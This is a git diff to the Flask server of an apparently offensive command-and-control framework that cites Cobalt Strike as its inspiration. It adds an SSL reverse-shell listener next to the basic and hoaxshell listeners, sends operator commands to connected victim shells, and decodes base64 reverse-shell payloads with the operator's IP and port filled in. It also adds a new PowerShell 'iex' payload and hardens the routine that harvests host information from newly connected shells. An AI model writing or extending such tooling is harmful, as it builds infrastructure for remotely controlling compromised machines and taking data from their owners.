@@ -1,11 +1,15 @@
 from flask import Flask, request, redirect, abort, send_from_directory, send_file, make_response, url_for
 from flask_socketio import SocketIO
-from core.server import shellServer, uploadServer
 import core.upload as uSrv
 
-# hoaxshell
+# control
+## hoaxshell
 import core.hoaxshell.payloads as hxPL
 import core.hoaxshell.server as hxSrv
+## basic
+from core.server import shellServer, uploadServer
+## ssl
+from core.sslserver import sslServer
 
 import socket, random, sys, threading
 import json, base64, os, bcrypt, time # bcrypt for blowfish login
@@ -17,6 +21,7 @@ socketio = SocketIO(app)
 port = int(sys.argv[1]) if len(sys.argv) >= 2 else random.randint(7000, 15535)
 
 shell = shellServer(port=port, websock=socketio) # basic port server
+sslShell = sslServer(port=port-8, websock=socketio)
 threading.Thread(target=hxSrv.startServer, args=("0.0.0.0", port+1,), daemon=True).start() # hoaxshell server
 upload = uploadServer(port=port-4) # upload server
 
@@ -133,6 +138,7 @@ def clientData():
     if not isAllowed(request): return {"failure": "login"}
 
     a = shell.info.copy()
+    a.update(sslShell.info.copy())
     a.update({"ouis": getOuis()})
     return a
 
@@ -153,10 +159,12 @@ def runcmd():
         a["command"] += ";echo 0"
 
     if type(a["uid"]) != list:
-        if len(a["uid"]) != 24:
-            dta = shell.runCommand(a["uid"], a["command"])
-        else:
+        if len(a["uid"]) == 24:
             dta = hxSrv.interactive.run(a['command'], a["uid"], timeout=float(a.get("timeout", 30)))
+        elif len(a["uid"]) == 20:
+            dta = sslShell.runCommand(a['uid'], a['command'])
+        else:
+            dta = shell.runCommand(a["uid"], a["command"])
         print(dta)
     else:
         for x in a["uid"]:
@@ -278,7 +286,11 @@ def normalPLGen():
         return "invalid payload"
     else:
         b = payloads[a["payload"]]
-        b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", json.loads(open("config.json", "r").read())["ip"]).replace("{port}", str(port)).replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
+        if "ssl" not in a["payload"]:
+            b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", json.loads(open("config.json", "r").read())["ip"]).replace("{port}", str(port)).replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
+        else:
+            b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", json.loads(open("config.json", "r").read())["ip"]).replace("{port}", str(port-8)).replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
+            
         return b
     
 @app.route("/api/generate/list", methods=["GET"])
@@ -287,7 +299,7 @@ def getPayloads():
     payloads = []
 
     payloads += list(json.loads(open("./core/payloads.json", "r").read())) # normal payloads
-    payloads += ["hoax-cURL", "hoax-iex", "hoax-iex-constrained", "hoax-iex-outfile", "hoax-iex-const-out"] # hoaxshell payloads
+    payloads += ["hoax-cURL", "hoax-iex", "hoax-iex-constrained", "hoax-iex-outfile", "hoax-iex-const-out", "azamuku-iex"] # hoaxshell payloads
 
     return {"payloads": payloads}
 
@@ -306,7 +318,8 @@ def randMessage():
         "meowsynth is the best thing to be created",
         "cat flag.txt",
         "we are not the 1%",
-        "inspired by cobalt strike"
+        "inspired by cobalt strike",
+        '"in a fight, there\'s only two ways to die: by giving up, or losing"'
     ]
 
     return random.choice(msgs)
@@ -357,13 +370,16 @@ def hoaxShellHarvester(): # the only point of this function is to automatically 
     while True:
         while len(hxSrv.shellData.hxUIDS) == old:
             time.sleep(0.1)
-    
-        shell.info.update({hxSrv.shellData.hxUIDS[-1]: shell.harvestInfo(hxSrv.shellData.hxUIDS[-1], hxSrv.interactive.run)})
-        socketio.send({"connection": shell.info[hxSrv.shellData.hxUIDS[-1]]})
 
-        old = len(hxSrv.shellData.hxUIDS)
+        try:
+            shell.info.update({hxSrv.shellData.hxUIDS[-1]: shell.harvestInfo(hxSrv.shellData.hxUIDS[-1], hxSrv.interactive.run)})
+            socketio.send({"connection": shell.info[hxSrv.shellData.hxUIDS[-1]]})
 
-        uSrv.allowedAuth.append(hxSrv.shellData.hxUIDS[-1]) # allow for uploading files
+            old = len(hxSrv.shellData.hxUIDS)
+
+            uSrv.allowedAuth.append(hxSrv.shellData.hxUIDS[-1]) # allow for uploading files
+        except:
+            pass
 
 threading.Thread(target=hoaxShellHarvester, daemon=True).start()
 threading.Thread(target=stages.sio.connect, args=('http://localhost:80',), daemon=True).start()
